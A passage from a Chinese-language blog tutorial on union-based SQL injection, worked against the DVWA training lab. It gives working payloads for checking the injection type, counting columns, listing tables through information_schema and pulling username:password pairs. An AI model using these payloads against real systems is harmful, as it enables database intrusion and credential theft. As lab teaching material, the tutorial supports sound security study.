&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;first_name&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;last_name&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那如果我们输入1&amp;rsquo; and 1=1#:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;first_name&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;last_name&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;可以看到，前面的&amp;rsquo;&amp;lsquo;闭合了，后面的&amp;rsquo;被我们注释了，中间的and1=1会被正常执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那么我们完全可以在这里面插入自己想要执行的sql语句，这就是SQL注入！&lt;/p&gt;
&lt;h2 id=&#34;1-union联合查询注入&#34;&gt;#1 union联合查询注入
&lt;/h2&gt;&lt;p&gt;虽然知道可以执行任意sql代码了，但是我们又不知道有哪些表，表里面有哪些元素，有什么用呢？&lt;/p&gt;
&lt;p&gt;所以，现在我们需要通过一系列的操作，来确定这些东西：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.判断是否存在注入，注入是字符型还是数字型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.猜测SQL查询语句中的字段数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.确定显示的字段顺序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.获取当前数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5.获取数据库中的表&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;6.获取表中的字段名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;7.显示字段信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那么，开始吧！&lt;/p&gt;
&lt;h3 id=&#34;常用函数&#34;&gt;常用函数
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;功能类别&lt;/th&gt;
          &lt;th&gt;函数/语句&lt;/th&gt;
          &lt;th&gt;主要数据库&lt;/th&gt;
          &lt;th&gt;功能描述&lt;/th&gt;
          &lt;th&gt;注入示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;系统信息查询&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;database()&lt;/code&gt; 或 &lt;code&gt;schema()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL&lt;/td&gt;
          &lt;td&gt;获取当前数据库的名称&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,database() #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;version()&lt;/code&gt; 或&lt;code&gt;@@version&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;通用&lt;/td&gt;
          &lt;td&gt;获取数据库的详细版本号&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,version() #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;user()&lt;/code&gt; 或 &lt;code&gt;current_user()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;通用&lt;/td&gt;
          &lt;td&gt;获取执行查询的数据库用户名&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,user() #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;@@hostname&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL, MSSQL&lt;/td&gt;
          &lt;td&gt;获取数据库服务器的主机名&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,@@hostname #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;@@datadir&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL&lt;/td&gt;
          &lt;td&gt;获取数据库文件的存储路径&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,@@datadir #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;数据查询与拼接&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;group_concat()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL, SQLite&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;纵向将多行结果合并成一个字符串一行显示&lt;/strong&gt;，用于一次性列出所有表名/列名&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,group_concat(table_name) from information_schema.tables #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;concat()&lt;/code&gt; 或 &lt;code&gt;concat_ws()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;MySQL&lt;/td&gt;
          &lt;td&gt;**横向将多个字符串或列连接成一个，但是不改变行数，**用于拼接用户名和密码等字段&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,concat(username,&#39;:&#39;,password) from users #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;count()&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;通用&lt;/td&gt;
          &lt;td&gt;统计行数&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; union select 1,count(*) from users #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;substring()&lt;/code&gt; 或 &lt;code&gt;limit&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;通用&lt;/td&gt;
          &lt;td&gt;截取字符串或按行返回。主要用于盲注，逐个字符或逐行猜解数据&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;&#39; and substring(database(),1,1)=&#39;a&#39; #&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;1判断注入是字符类型or数字型&#34;&gt;1.判断注入是字符类型or数字型
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;为什么需要判断？因为数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;**数字型：**select * from table where id =$id，我们可以直接输入&lt;code&gt;1 and ...&lt;/code&gt; 进行执行:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;**字符型：**select * from table where id=&amp;rsquo;$id&amp;rsquo;我们需要输入&lt;code&gt;1&#39; and ... #&lt;/code&gt;  ，闭合前后单引号&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; ... &lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;       
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;关于注释：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;ndash; 是官方的注释，后面必须跟空格&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;# 是mysql特有的注释，后面无需跟空格&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;如果直接在url中注入而非输入框，需要使用%23代替#，因为浏览器会把#后面内容截断，而非编码&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;有的网站会过滤空格导致&amp;ndash;报错，这时候可以使用&amp;ndash;+，用+代替空格&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以上方法不一定全部适用，需要结合实际情况尝试&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;基于这种思路，只要我们能够测试注入成功，使得页面不出现语法报错，那么就可以借此判断出类型：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;测试目的&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;测试Payload&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;预期结果&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;判断数字型&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;1 and 1=1&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;页面 &lt;strong&gt;正常&lt;/strong&gt;，与 &lt;code&gt;?id=1&lt;/code&gt; 时相同&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;1 and 1=2&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;页面 &lt;strong&gt;内容异常&lt;/strong&gt; (如变空)，但不是程序或语法报错&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;判断字符型&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;1&#39; and &#39;1&#39;=&#39;1&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;页面 &lt;strong&gt;正常&lt;/strong&gt;，与 &lt;code&gt;?id=&#39;1&#39;&lt;/code&gt; 时相同&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;1&#39; and &#39;1&#39;=&#39;2&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;页面 &lt;strong&gt;内容异常&lt;/strong&gt; (如变空)，但不是程序或语法报错&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;分别测试是否对应的结果&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;还有更加简单（但是不知道是否一定有效的方法）：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;输入&lt;code&gt;2-1&lt;/code&gt;，如果是数字型，就会执行&lt;code&gt;2-1&lt;/code&gt;运算，&lt;code&gt;id=1&lt;/code&gt;；如果是字符型，就会是&lt;code&gt;id=2&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以构造一个&lt;code&gt;m-n&lt;/code&gt;，&lt;code&gt;m&lt;/code&gt;是不存在的&lt;code&gt;id&lt;/code&gt;，但&lt;code&gt;m-n&lt;/code&gt;结果是存在的&lt;code&gt;id&lt;/code&gt;，依据结果来判断是字符型还是数字型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这一点在盲注时比较方便&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;通过以上测试，我们知道了现在DVWA的注入类型是字符型&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:15px&#34;&gt;&lt;strong&gt;当然，在写题的时候很有可能你一个也试不出来，因为它是被&lt;code&gt;(&#39;&#39;)&lt;/code&gt;或者&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;包裹的，这就需要你凭感觉试了&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#fab920;font-size:15px&#34;&gt;&lt;strong&gt;不过在此之前，先检查一下你之前的语句有没有写对吧~&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;2猜测sql查询语句中的字段数列数&#34;&gt;2.猜测SQL查询语句中的字段数（列数）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;从1开始，使用order by语句指定查询结果依照第n列排序，如果报错，说明不存在该行列&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order by 1 #   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order by 2 #  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order by 3 #      //报错了
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;order by 3的时候报错，说明当前查询的表中只有2列&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;and&lt;/code&gt;：如果and前为真，执行后面内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;or&lt;/code&gt;：如果前面为假，才执行后面内容&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;3确定显示的字段顺序&#34;&gt;3.确定显示的字段顺序
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;虽然我们知道了字段数，但很可能这些字段不是都显示在网页前端的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假如其中某些字段的查询结果是会返回到前端的，那么我们就需要知道这些字段中哪些结果会回显，如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这时候我们利用一个简单的语句：select 1,2,3，根据显示在页面上的数字就可以知道回显位置（sql特性）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;之后，我们只需要把这个数字改成我们想查询的内容（如id,password），就会在窗口显示我们想要的结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,2 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626115719525.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626115719525&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这样就确定了网站执行的SQL语句为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;Firstname&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;Surname&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;xx&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ID&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;从过程中也不难看出，其实确定字段列数和显示顺序可以一起做&lt;/strong&gt;
&lt;strong&gt;从union select 1开始，一直增加select后的位数，直到报错为止&lt;/strong&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;4获取当前数据库&#34;&gt;4.获取当前数据库
&lt;/h3&gt;&lt;p&gt;知道了回显位，我们就可以把回显位替换成想要的数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;这里一定要写全，有多少字段，select后面就要有多少相应的字段&lt;/mark&gt;&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database() #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;database()&lt;/code&gt; 是mysql内置函数，当数据库执行到它时，会将其替换为当前正在使用的数据库的名称&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626135800624.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626135800624&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;于是，我们就知道了当前数据库名称为&lt;code&gt;dvwa&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;5获取数据库中的表&#34;&gt;5.获取数据库中的表
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;information_schema.tables表存储了数据表的元数据信息：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;字段名 (Field Name)&lt;/th&gt;
          &lt;th&gt;描述 (Description)&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;table_schema&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录该表所在的数据库的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;table_name&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录数据表的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;engine&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录该表使用的存储引擎，例如 &lt;code&gt;InnoDB&lt;/code&gt;, &lt;code&gt;MyISAM&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;table_rows&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;关于表中总行数的一个粗略估计值&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;data_length&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录数据表本身的大小（单位：字节）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;index_length&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录数据表索引的大小（单位：字节）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;row_format&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;记录行的格式，例如 &lt;code&gt;Dynamic&lt;/code&gt; 或 &lt;code&gt;Compressed&lt;/code&gt;，可用于判断表是否被压缩&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;我们就可以从中得到想要的信息：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142534142.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626142534142&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;上面的语句效果等同于下面的语句，只不过使用了&lt;code&gt;group_concat()&lt;/code&gt;，让输出的内容拼成了一个字符串：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,table_name from information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250626142649062.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250626142649062&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;这样就知道了dvwa里面一共有两个表，分别为guestbook和users&lt;/p&gt;
&lt;h3 id=&#34;6获取表中的字段名&#34;&gt;6.获取表中的字段名
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;information_schema.columns表存储了所有表所有列的元数据信息：&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;字段名&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;COLUMN_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录列的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;TABLE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列所属的数据表的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;TABLE_SCHEMA&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列所属的数据库的名称&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;ORDINAL_POSITION&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列在表中的位置顺序（一个从1开始的数字）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;DATA_TYPE&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列的数据类型，例如 &lt;code&gt;varchar&lt;/code&gt;, &lt;code&gt;int&lt;/code&gt;, &lt;code&gt;text&lt;/code&gt; 等&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;COLUMN_KEY&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;记录该列是否为键（索引）。&lt;code&gt;PRI&lt;/code&gt; 代表主键, &lt;code&gt;UNI&lt;/code&gt; 代表唯一键, &lt;code&gt;MUL&lt;/code&gt; 代表可重复的索引&lt;/td&gt;
      &lt;/tr&gt;
